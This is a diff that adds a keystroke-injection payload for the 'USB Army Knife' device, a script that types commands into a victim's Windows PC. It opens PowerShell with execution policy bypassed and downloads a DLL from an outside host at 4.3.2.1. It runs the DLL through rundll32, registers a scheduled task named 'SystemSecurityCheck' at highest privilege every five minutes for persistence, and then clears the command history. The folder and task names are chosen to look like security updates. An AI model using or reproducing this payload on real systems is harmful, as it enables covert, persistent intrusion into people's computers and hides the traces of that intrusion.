@@ -1,0 +1,60 @@
+REM =========================================
+REM USB Army Knife - Agent Deployment Payload
+REM =========================================
+REM This payload downloads and installs the Agent
+REM on the target PC for persistent access
+REM =========================================
+
+REM Wait for USB to be recognized
+DELAY 2000
+
+REM Open PowerShell as Admin (requires user to accept UAC)
+GUI r
+DELAY 500
+STRING powershell -ExecutionPolicy Bypass
+ENTER
+DELAY 1500
+
+REM Create working directory
+STRING $agentDir = "$env:APPDATA\SecurityUpdate"; New-Item -ItemType Directory -Force -Path $agentDir | Out-Null
+ENTER
+DELAY 300
+
+REM Download Agent DLL from T-Dongle
+REM Assumes T-Dongle WiFi is already connected
+STRING Invoke-WebRequest -Uri "http://4.3.2.1:8080/download?filename=/agent/PortableApp.dll" -OutFile "$agentDir\PortableApp.dll"
+ENTER
+DELAY 2000
+
+REM Create a launcher script
+STRING @"
+ENTER
+STRING @echo off
+ENTER
+STRING set AGENT_DLL=%APPDATA%\SecurityUpdate\PortableApp.dll
+ENTER
+STRING rundll32 "%AGENT_DLL%" Open32 vid=303A pid=1001
+ENTER
+STRING "@ | Out-File -FilePath "$agentDir\agent.bat" -Encoding ASCII
+ENTER
+DELAY 300
+
+REM Setup persistence via Scheduled Task (runs every 5 minutes)
+STRING $action = New-ScheduledTaskAction -Execute "$agentDir\agent.bat"
+ENTER
+DELAY 300
+STRING $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
+ENTER
+DELAY 300
+STRING Register-ScheduledTask -TaskName "SystemSecurityCheck" -Action $action -Trigger $trigger -RunLevel Highest -Force
+ENTER
+DELAY 500
+
+REM Start the Agent immediately
+STRING Start-Process -FilePath "$agentDir\agent.bat" -WindowStyle Hidden
+ENTER
+DELAY 300
+
+REM Clean up traces
+STRING Clear-History; exit
+ENTER
